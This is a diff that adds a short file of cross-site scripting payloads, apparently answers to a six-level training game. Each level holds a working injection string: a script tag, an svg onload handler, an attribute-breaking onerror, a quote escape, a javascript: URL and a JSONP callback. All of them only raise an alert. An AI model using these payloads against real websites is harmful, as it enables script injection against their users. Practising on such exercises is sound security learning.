@@ -1,0 +1,17 @@
+level 1
+<script>alert('krishna')</script>
+
+level 2
+<svg onload=alert('krishna')>
+
+level 3
+4"' onerror="javascript:alert('krishna')"
+
+level 4
+3');alert('krishna
+
+level 5
+next=javascript:alert('krishna')
+
+level 6
+frame#//www.google.com/jsapi?callback=alert 
